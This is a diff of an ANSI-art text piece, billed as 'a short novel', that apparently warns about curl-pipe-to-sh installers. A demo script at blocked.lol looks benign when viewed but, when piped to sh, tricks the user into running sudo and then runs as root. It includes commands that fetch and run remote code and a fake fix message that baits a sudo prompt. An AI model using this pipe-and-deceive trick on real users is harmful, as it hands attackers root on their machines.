@@ -23,75 +23,75 @@
 [1;31m       :      : :  :      :: : ::    :   : :  :: : :     :   : :[0m
 
 
-                            - a short novel -
+                        - a short novel -
 
 
-    Nowadays it's very common for installation scripts to just recommend
-    running something like curl -sL https://ourdomain.com/install | sh
+Nowadays it's very common for installation scripts to just recommend
+running something like curl -sL https://ourdomain.com/install | sh
 
-    You want to get it working ASAP? You just run it.
+You want to get it working ASAP? You just run it.
 
-    Have you ever been bitten by someone modifying these scripts?
+Have you ever been bitten by someone modifying these scripts?
 
-    You'd probably do this then:
+You'd probably do this then:
 
-    [38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
-    $ curl -sL blocked.lol/greetz.sh
-    # blocked.lol greetingz shell script 2020
-    # We declare USERNAME variable with the result of whoami
-    USERNAME=$(whoami)
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
+$ curl -sL blocked.lol/greetz.sh
+# blocked.lol greetingz shell script 2020
+# We declare USERNAME variable with the result of whoami
+USERNAME=$(whoami)
 
-    # Finally by invoking the built-in echo command, we say Hello $USERNAME
-    echo "Hello $USERNAME"
+# Finally by invoking the built-in echo command, we say Hello $USERNAME
+echo "Hello $USERNAME"
 
-    Fine, this script is safe after all... but wait, what?
+Fine, this script is safe after all... but wait, what?
 
-    [38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
-    $ curl -sL blocked.lol/greetz.sh | sh
-    curl is desynchronized!
-    Run sudo curl -sS ntppool.org to fix
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
+$ curl -sL blocked.lol/greetz.sh | sh
+curl is desynchronized!
+Run sudo curl -sS ntppool.org to fix
 
-    Weird, never seen this one, but let's go
-    [38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
-    $ sudo curl -sS ntppool.org
-    Password:
-    <html>
-    <head><title>301 Moved Permanently</title></head>
-    <body>
-    <center><h1>301 Moved Permanently</h1></center>
-    <hr><center>nginx/1.17.8</center>
-    </body>
-    </html>
+Weird, never seen this one, but let's go
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
+$ sudo curl -sS ntppool.org
+Password:
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>nginx/1.17.8</center>
+</body>
+</html>
 
-    Hm, ok let's try again...
-    [38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
-    $ curl -sL blocked.lol/greetz.sh | sh
-    Hello root
-    I am root! Try cat -t on greetz.sh
+Hm, ok let's try again...
+[38;5;141m[[38;5;219mdevice[38;5;226m@[38;5;86mhome[38;5;141m]-[[38;5;159m13:33:37[38;5;141m]-[[38;5;226m~[38;5;141m][0m
+$ curl -sL blocked.lol/greetz.sh | sh
+Hello root
+I am root! Try cat -t on greetz.sh
 
-                          ____...
-                 .-"--"""".__    `.
-                |            `    |
-      (         `._....------.._.:
-       )         .()''        ``().
-      '          () .=='  `===  `-.
-       . )       (         g)
-        )         )     /        J
-       (          |.   /      . (
-       [1;33m$[31m$[0m         (.  (_'.   , )|`
-       ||         |\`-....--'/  ' \
-      /||.         \\ | | | /  /   \.
-     //[33m||[37m(\         \`-===-'  '     \o.
-    .//7' |)         `. --   / (     [1;34mOObaaaad888b.
-    [0m(<<. / |     .a888b`.__.'d\     OO888888888888a.
-     \  Y' |    .[1;34m8888888aaaa88POOOOOO888888888888888.
-    [0m  \  \ |   .888888888888888888888888888888888888b
-       |   |  [1;34m.d88888P88888888888888888888888b8888888.
-    [0m   b.--d .d88888P8888888888888888a:f888888|888888b
-       [1;34m88888b 888888|8888888888888888888888888\8888888
-    [0m
+                      ____...
+             .-"--"""".__    `.
+            |            `    |
+  (         `._....------.._.:
+   )         .()''        ``().
+  '          () .=='  `===  `-.
+   . )       (         g)
+    )         )     /        J
+   (          |.   /      . (
+   [1;33m$[31m$[0m         (.  (_'.   , )|`
+   ||         |\`-....--'/  ' \
+  /||.         \\ | | | /  /   \.
+ //[33m||[37m(\         \`-===-'  '     \o.
+.//7' |)         `. --   / (     [1;34mOObaaaad888b.
+[0m(<<. / |     .a888b`.__.'d\     OO888888888888a.
+ \  Y' |    .[1;34m8888888aaaa88POOOOOO888888888888888.
+[0m  \  \ |   .888888888888888888888888888888888888b
+   |   |  [1;34m.d88888P88888888888888888888888b8888888.
+[0m   b.--d .d88888P8888888888888888a:f888888|888888b
+   [1;34m88888b 888888|8888888888888888888888888\8888888
+[0m
 
 
-    Do you want to know what happened? Run this
+Do you want to know what happened? Run this
 
-    curl -sL blocked.lol/greetz.sh | cat -t
+curl -sL blocked.lol/greetz.sh | cat -t
